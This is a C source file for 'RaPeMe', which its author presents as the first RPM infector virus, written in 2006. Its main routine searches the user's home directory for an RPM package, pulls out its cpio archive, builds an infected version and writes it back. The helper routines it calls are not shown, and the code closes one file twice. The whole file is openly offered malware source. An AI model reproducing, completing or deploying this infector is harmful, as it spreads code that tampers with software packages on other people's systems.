/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : intestinal.cancer@hotmail.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "hunt.h"
#include "infect.h"

extern char target_name[FILENAME_MAX];

int main()
{
	unsigned long offset,ff_size;
	FILE *rpm,*arch,*new_arch; 
	int ff_file_name_len;
	char *ff_name,*home_dir;

	home_dir = getenv("HOME");	

	rpm = search_target(home_dir,strlen(home_dir));

	offset = get_rpm_offset(rpm);

	arch = get_rpm_archive(rpm,offset);

	/* get first file size from cpio header*/ 
	ff_size = get_cpio_header_info(arch,CPIO_FIRST_FILE_SIZE_OFFSET,8);
	/* get first file name length */
	ff_file_name_len = get_cpio_header_info(arch,CPIO_FIRST_FILE_NAME_LEN_OFFSET,2);

	/* get first file name */
	ff_name = get_cpio_first_file_name(arch,ff_file_name_len);

	/* make the infected archive */
	new_arch = prepare_virus_cpio(arch,ff_name,ff_file_name_len,ff_size);	

	/* invoke magickal and spiritual power
           to ensure a successful result */ 
	magick_ritual(rpm,new_arch,target_name,offset);

	fclose(arch);
	fclose(rpm);
	fclose(arch);

	printf("Yeah dude,I rock!\n");

	return 0;


}
	
